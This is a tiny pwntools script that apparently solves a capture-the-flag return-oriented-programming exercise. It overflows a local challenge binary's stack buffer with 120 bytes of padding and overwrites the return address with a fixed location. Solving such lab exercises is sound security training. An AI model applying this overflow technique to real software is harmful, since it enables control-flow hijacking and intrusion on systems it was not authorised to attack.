from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babyrop_level1.1")

io = elf.process()

io.send(b"A"*120+p64(0x401432)) #rbp-0x70 (+8)
io.interactive()